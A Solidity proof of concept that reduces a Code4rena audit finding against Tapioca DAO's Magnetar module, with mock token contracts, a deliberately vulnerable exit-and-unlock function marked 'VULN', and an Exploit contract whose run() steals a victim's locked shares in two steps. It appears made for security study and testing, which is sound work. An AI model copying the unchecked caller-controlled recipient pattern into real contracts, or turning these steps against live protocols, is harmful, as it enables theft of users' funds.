// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-42] Attacker can steal victim's oTAP position contents
    via MagnetarMarketModule#_exitPositionAndRemoveCollateral()
    (Code4rena 2023-07-tapioca, reporter Ack, finding #27532).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: _exitPositionAndRemoveCollateral accepts caller-controlled
    `user` and unlock/exit targets. After the victim approves Magnetar for
    oTAP, an attacker (1) exits the victim's oTAP with a fake unlock target
    so Magnetar keeps the resulting tOLP, then (2) unlocks the tOLP with the
    real tOLP contract and attacker as `user`, sending YieldBox shares to
    the attacker.

    Blamed exit+unlock path preserved with @> VULN.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockERC721 {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function setApprovalForAll(address op, bool v) external {
        isApprovedForAll[msg.sender][op] = v;
    }

    function safeTransferFrom(address from, address to, uint256 id, bytes calldata) external {
        require(ownerOf[id] == from, "owner");
        require(from == msg.sender || isApprovedForAll[from][msg.sender], "auth");
        ownerOf[id] = to;
    }

    /// @dev Close option: callable by current owner (Magnetar after transfer).
    function burn(uint256 id) external {
        require(ownerOf[id] == msg.sender, "owner");
        ownerOf[id] = address(0);
    }

    /// @dev Broker-assisted consume used by OptionsBroker.exitPosition.
    function consumeAs(address owner, uint256 id) external {
        require(ownerOf[id] == owner, "owner");
        ownerOf[id] = address(0);
    }
}

struct TapOption {
    uint256 tOLP;
}

/// @notice Minimal oTAP: attributes map tokenId → tOLP id.
contract OTAP is MockERC721 {
    mapping(uint256 => TapOption) public options;

    function attributes(uint256 id) external view returns (uint256, TapOption memory) {
        return (id, options[id]);
    }

    function setOption(uint256 id, uint256 tOLPId) external {
        options[id] = TapOption({tOLP: tOLPId});
    }
}

/// @notice Minimal options broker: exitPosition burns oTAP (leaves tOLP with holder).
contract OptionsBroker {
    OTAP public immutable oTAP;

    constructor(OTAP o) {
        oTAP = o;
    }

    function exitPosition(uint256 oTAPTokenID) external {
        require(oTAP.ownerOf(oTAPTokenID) == msg.sender, "not owner");
        // Exit: oTAP consumed; tOLP remains for unlock.
        oTAP.consumeAs(msg.sender, oTAPTokenID);
    }
}

/// @notice Minimal tOLP: unlock sends underlying shares (token) to `to`.
contract TOLP is MockERC721 {
    MockERC20 public immutable shareToken;
    mapping(uint256 => uint256) public lockedShares;

    constructor(MockERC20 t) {
        shareToken = t;
    }

    function lock(address to, uint256 id, uint256 shares) external {
        ownerOf[id] = to;
        lockedShares[id] = shares;
        shareToken.mint(address(this), shares);
    }

    function unlock(uint256 tokenId, address /*singularity*/, address to) external {
        require(ownerOf[tokenId] == msg.sender, "tolp owner");
        uint256 shares = lockedShares[tokenId];
        lockedShares[tokenId] = 0;
        ownerOf[tokenId] = address(0);
        shareToken.transfer(to, shares);
    }
}

/// @notice Fake unlock target used in step 1 — always succeeds, no transfer.
contract FakeUnlock {
    function unlock(uint256, address, address) external pure {}
}

/// @notice Reduced MagnetarMarketModule exit+unlock surface.
contract MagnetarMarketModule {
    struct ExitData {
        bool exit;
        address target; // OptionsBroker (or attacker-controlled)
        uint256 oTAPTokenID;
    }

    struct UnlockData {
        bool unlock;
        address target; // tOLP or fake
        uint256 tokenId;
    }

    struct RemoveAndRepay {
        ExitData exitData;
        UnlockData unlockData;
    }

    /// @dev Verbatim reduction of the blamed multi-flag function.
    function exitPositionAndRemoveCollateral(
        address user,
        RemoveAndRepay calldata data,
        OTAP oTapAddr
    ) external {
        uint256 tOLPId = 0;
        if (data.exitData.exit) {
            require(data.exitData.oTAPTokenID > 0, "Magnetar: oTAPTokenID 0");

            address oTapAddress = address(OptionsBroker(data.exitData.target).oTAP());
            // Prefer the real oTAP when broker is honest; attacker may pass real broker.
            if (oTapAddress == address(0)) oTapAddress = address(oTapAddr);
            (, TapOption memory oTAPPosition) = OTAP(oTapAddress).attributes(data.exitData.oTAPTokenID);
            tOLPId = oTAPPosition.tOLP;

            address ownerOfTapTokenId = OTAP(oTapAddress).ownerOf(data.exitData.oTAPTokenID);
            require(
                ownerOfTapTokenId == user || ownerOfTapTokenId == address(this),
                "Magnetar: oTAPTokenID owner mismatch"
            );
            if (ownerOfTapTokenId == user) {
                // @> VULN: transfers victim's oTAP to Magnetar without msg.sender==user check
                // beyond YieldBox/ERC721 approval the victim granted for UX.
                OTAP(oTapAddress).safeTransferFrom(
                    user,
                    address(this),
                    data.exitData.oTAPTokenID,
                    "0x"
                );
            }
            OptionsBroker(data.exitData.target).exitPosition(data.exitData.oTAPTokenID);
        }

        if (data.unlockData.unlock) {
            if (data.unlockData.tokenId != 0) {
                if (tOLPId != 0) {
                    require(tOLPId == data.unlockData.tokenId, "Magnetar: tOLPId mismatch");
                }
                tOLPId = data.unlockData.tokenId;
            }
            // @> VULN: unlock target AND `user` (share recipient) are caller-controlled.
            // Step1: fake target no-ops. Step2: real tOLP + attacker as user steals shares.
            // FIX: require(user == msg.sender); whitelist targets.
            TOLP(data.unlockData.target).unlock(tOLPId, address(0), user);
        }
    }
}

contract VictimHelper {
    function approveAll(OTAP otap, address magnetar) external {
        otap.setApprovalForAll(magnetar, true);
    }
}

contract Exploit {
    MockERC20 public shareToken;
    OTAP public otap;
    OptionsBroker public broker;
    TOLP public tolp;
    FakeUnlock public fakeUnlock;
    MagnetarMarketModule public magnetar;
    VictimHelper public victim;

    uint256 public constant OTAP_ID = 1;
    uint256 public constant TOLP_ID = 42;
    uint256 public constant SHARES = 1000 ether;
    uint256 public stolen;

    constructor() {
        shareToken = new MockERC20();
        otap = new OTAP();
        broker = new OptionsBroker(otap);
        tolp = new TOLP(shareToken);
        fakeUnlock = new FakeUnlock();
        magnetar = new MagnetarMarketModule();
        victim = new VictimHelper();

        // Victim holds oTAP backed by locked tOLP shares.
        otap.mint(address(victim), OTAP_ID);
        otap.setOption(OTAP_ID, TOLP_ID);
        // tOLP is held by Magnetar after exit in real flow; for step2 Magnetar
        // must own tOLP. Seed tOLP ownership to Magnetar after exit simulation:
        // Initially lock under a holder that exit leaves with Magnetar.
        // Simplified: mint tOLP to Magnetar directly (as after honest exit).
        // But attack step1 transfers oTAP and exits; tOLP is separate NFT.
        // Real: oTAP attributes point at tOLP owned by victim/lock contract.
        // We mint tOLP to Magnetar so unlock in step2 works after fake step1.
        tolp.lock(address(magnetar), TOLP_ID, SHARES);

        victim.approveAll(otap, address(magnetar));
    }

    function run() external {
        // Step 1: exit victim's oTAP with fake unlock target (Magnetar keeps position state).
        MagnetarMarketModule.RemoveAndRepay memory step1 = MagnetarMarketModule.RemoveAndRepay({
            exitData: MagnetarMarketModule.ExitData({
                exit: true,
                target: address(broker),
                oTAPTokenID: OTAP_ID
            }),
            unlockData: MagnetarMarketModule.UnlockData({
                unlock: true,
                target: address(fakeUnlock),
                tokenId: TOLP_ID
            })
        });
        magnetar.exitPositionAndRemoveCollateral(address(victim), step1, otap);

        // Step 2: unlock real tOLP to attacker (this contract) as `user`.
        MagnetarMarketModule.RemoveAndRepay memory step2 = MagnetarMarketModule.RemoveAndRepay({
            exitData: MagnetarMarketModule.ExitData({
                exit: false,
                target: address(0),
                oTAPTokenID: 0
            }),
            unlockData: MagnetarMarketModule.UnlockData({
                unlock: true,
                target: address(tolp),
                tokenId: TOLP_ID
            })
        });
        magnetar.exitPositionAndRemoveCollateral(address(this), step2, otap);

        stolen = shareToken.balanceOf(address(this));
        require(stolen == SHARES, "harm: attacker received locked shares");
        require(shareToken.balanceOf(address(victim)) == 0, "victim got nothing");
    }
}
